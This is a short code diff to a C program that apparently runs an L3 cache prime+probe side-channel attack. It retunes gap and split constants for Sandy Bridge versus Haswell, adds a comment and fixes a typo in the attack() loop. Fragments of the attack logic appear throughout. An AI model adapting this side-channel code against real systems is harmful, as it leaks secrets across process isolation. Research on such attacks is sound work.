@@ -4,10 +4,10 @@
  // Sandy Bridge (sandy)
 static const char mask[] = ".....@@@@@@.....";
 #define ALLOWEDMISSES 2
-//#define GAPLEN 200  /*used for sandybridge, 32 bit */
-#define SPLIT 15
+#define GAPLEN 200  /*used for sandybridge, 32 bit */
+#define SPLIT 20 /* to 25*/
 
-#define GAPLEN 16  /*used for haswell4, 64 bit */
+//#define GAPLEN 16  /*used for haswell4, 64 bit */
 #define RECORDLEN 100000
 #define SLOT 5000
 
@@ -219,6 +219,7 @@ static void attack(cachemap_t cm) {
   int found = 0;
   for (int offset = 0; offset < 4096; offset += 64) {
     for (int i = 0; i < cm->nsets; i++)
+        /*page. colours*/
       pps[i] = pp_prepare(cm->sets[i], L3_ASSOCIATIVITY, offset);
     printf("Trying offset 0x%03x\n", offset);
     for (int i = 0; i < cm->nsets; i++) {
@@ -239,7 +240,7 @@ static void attack(cachemap_t cm) {
 	}
 
 	cleanup(record);
-	printf("after cleannng up: %.150s\n", record);
+	printf("after cleaning up: %.150s\n", record);
 	
 	char *start = findstart(record);
         /*start cannot be a NULL pointer*/
